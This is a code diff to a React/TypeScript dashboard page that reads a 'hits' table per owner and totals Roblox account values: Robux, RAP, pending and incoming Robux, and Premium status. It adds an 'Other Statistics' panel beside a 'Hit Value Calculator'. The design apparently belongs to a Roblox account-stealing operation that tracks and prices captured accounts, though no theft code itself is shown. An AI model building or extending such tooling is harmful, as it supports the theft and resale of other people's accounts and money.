@@ -11,6 +11,10 @@ interface HitRow {
   roblox_rap: number | null;
   roblox_gamepass_earnings: number | null;
   roblox_robux_spent: number | null;
+  roblox_pending_robux: number | null;
+  roblox_incoming_robux: number | null;
+  roblox_summary: number | null;
+  roblox_premium: boolean | null;
   created_at: string;
 }
 
@@ -27,7 +31,7 @@ const InfoPage = () => {
   useEffect(() => {
     supabase
       .from('hits')
-      .select('id, roblox_robux, roblox_rap, roblox_gamepass_earnings, roblox_robux_spent, created_at')
+      .select('id, roblox_robux, roblox_rap, roblox_gamepass_earnings, roblox_robux_spent, roblox_pending_robux, roblox_incoming_robux, roblox_summary, roblox_premium, created_at')
       .eq('owner_id', profile.id)
       .order('created_at', { ascending: true })
       .limit(2000)
@@ -36,19 +40,23 @@ const InfoPage = () => {
 
   const totals = useMemo(() => {
     if (!hits) return null;
-    let robux = 0, rap = 0, gamepass = 0, spent = 0;
+    let robux = 0, rap = 0, gamepass = 0, spent = 0, pending = 0, incoming = 0, summary = 0, premium = 0;
     for (const h of hits) {
       robux += h.roblox_robux ?? 0;
       rap += h.roblox_rap ?? 0;
       gamepass += h.roblox_gamepass_earnings ?? 0;
       spent += h.roblox_robux_spent ?? 0;
+      pending += h.roblox_pending_robux ?? 0;
+      incoming += h.roblox_incoming_robux ?? 0;
+      summary += h.roblox_summary ?? 0;
+      if (h.roblox_premium) premium++;
     }
     const liquidRobux = robux + gamepass;
     const rapValue = Math.floor(rap * RAP_LIQUIDITY);
     const totalRobux = liquidRobux + rapValue;
     return {
       hits: hits.length,
-      robux, rap, gamepass, spent,
+      robux, rap, gamepass, spent, pending, incoming, summary, premium,
       liquidRobux,
       rapValue,
       totalRobux,
@@ -104,6 +112,37 @@ const InfoPage = () => {
 
   return (
     <div className="space-y-6">
+      {/* Other Statistics — quick aggregate panel */}
+      <div className="blox-card p-5">
+        <div className="text-sm font-semibold text-gray-300 mb-4">Other Statistics</div>
+        <div className="divide-y divide-white/5">
+          <div className="flex justify-between py-2 text-sm">
+            <span className="text-gray-400">Total RAP</span>
+            <span className="font-mono">{totals.rap.toLocaleString()}</span>
+          </div>
+          <div className="flex justify-between py-2 text-sm">
+            <span className="text-gray-400">Total Robux</span>
+            <span className="font-mono">{totals.robux.toLocaleString()}</span>
+          </div>
+          <div className="flex justify-between py-2 text-sm">
+            <span className="text-gray-400">Pending Robux</span>
+            <span className="font-mono text-yellow-300">{totals.pending.toLocaleString()}</span>
+          </div>
+          <div className="flex justify-between py-2 text-sm">
+            <span className="text-gray-400">Incoming (Past Year)</span>
+            <span className="font-mono text-green-300">{totals.incoming.toLocaleString()}</span>
+          </div>
+          <div className="flex justify-between py-2 text-sm">
+            <span className="text-gray-400">Summary (Past Year)</span>
+            <span className="font-mono">{totals.summary.toLocaleString()}</span>
+          </div>
+          <div className="flex justify-between py-2 text-sm">
+            <span className="text-gray-400">Premium Accounts</span>
+            <span className="font-mono">{totals.premium}</span>
+          </div>
+        </div>
+      </div>
+
       {/* Hit Value Calculator */}
       <div>
         <h2 className="text-lg font-semibold mb-3 flex items-center gap-2">
